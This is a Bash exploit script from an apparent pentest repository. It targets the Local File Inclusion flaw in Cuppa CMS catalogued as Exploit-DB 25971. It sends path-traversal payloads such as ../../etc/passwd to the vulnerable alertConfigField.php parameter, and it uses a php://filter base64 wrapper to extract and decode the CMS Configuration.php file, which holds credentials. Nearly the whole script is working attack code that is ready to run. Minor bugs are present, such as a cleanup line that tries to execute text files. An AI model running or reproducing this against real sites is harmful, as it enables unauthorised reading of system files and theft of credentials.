#!/bin/bash

#############################################################################
#   Repositorio:    Pentest Scrpts - CVEs                                   #
#   Nome:           Exploit Cuppa CMS 25971                                 #
#   Descrição:      Exploit para LFI                                        #
#   Autor:          Carine Constantino                                      #
#   Versão:         1.0                                                     #
#   Data:           24/04/2021                                              #                                      
#   Função:         Script para explorar a vulnerabilidade                  #  
#                   LFI - Local File Inclusion na aplicação                 #
#                   Cuppa CMS.                                              #
#   Exploit-DB: Exploit-DB: https://www.exploit-db.com/exploits/25971\n     #
#                                                                           #
#############################################################################

if [ "$1" == 0 ]
then
	green="\e[32m"
	normal="\e[0m"
	
	echo -e "${green}"Cuppa CMS" ${normal}"
	echo -e "${green}"Exploit - Local File Inclusion" ${normal}"
	echo -e "${green}"Exploit-DB: https://www.exploit-db.com/exploits/25971\n" ${normal}"

	echo -e "${green}"Exemplo: ./lfi-cuppa-cms-25971.sh [OPTIONS] [URL] [PAYLOAD]" ${normal}"
	echo -e "${green}"Option 1: ./lfi-cuppa-cms-25971.sh 1 http://[TARGET]" ${normal}"
	echo -e "${green}"Option 2: ./lfi-cuppa-cms-25971.sh 2 http://[TARGET] ../../../../../../../../../etc/passwd" ${normal}"
fi
if [ "$1" == 1 ]
then
	
	green="\e[32m"
	normal="\e[0m"

	rm result.txt
	echo -e "${green}"Cuppa CMS" ${normal}"
	echo -e "${green}"Exploit - Local File Inclusion" ${normal}"
	echo -e "${green}"Exploit-DB: https://www.exploit-db.com/exploits/25971\n" ${normal}"
	
	echo -e "${green}"#######################################################" ${normal}"
	echo -e "${green}"ATTACKING....!!!"  ${normal}"
	echo -e "${green}"URL:" $2 ${normal}"
	echo -e "${green}"RESOURCE: /alerts/alertConfigField.php?urlConfig=" ${normal}"
	echo -e "${green}"PAYLOAD:" $3 ${normal}\n"

	curl -X GET "$2/alerts/alertConfigField.php?urlConfig=$3" -s -o result.txt 
	echo -e "${green}"RESULT:" ${normal}"
	echo $(cat -T result.txt | grep -v "</div>") 
fi 

if [ "$1" == 2 ]
then	

	green="\e[32m"
	normal="\e[0m"

	rm result.txt && c.txt && d.txt
	echo -e "${green}"Cuppa CMS" ${normal}"
	echo -e "${green}"Exploit - Local File Inclusion" ${normal}"
	echo -e "${green}"Exploit-DB: https://www.exploit-db.com/exploits/25971\n" ${normal}"

	echo -e "${green}"#######################################################" ${normal}"
	echo -e "${green}"ATTACKING....!!!" ${normal}"
	echo -e "${green}"URL:" $2 ${normal}"
	echo -e "${green}"RESOURCE: /alerts/alertConfigField.php?urlConfig=" ${normal}"
	echo -e "${green}"PAYLOAD: php://filter/convert.base64-encode/resource=../Configuration.php" ${normal}"

	curl -X GET "$2/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php" -s -o result.txt
	cat result.txt | tail -n 2 | awk '{print$1}' > c.txt 
	cat c.txt | base64 --decode > d.txt
	echo -e "${green}"RESULT:" ${normal}"
	echo $(cat d.txt)
fi
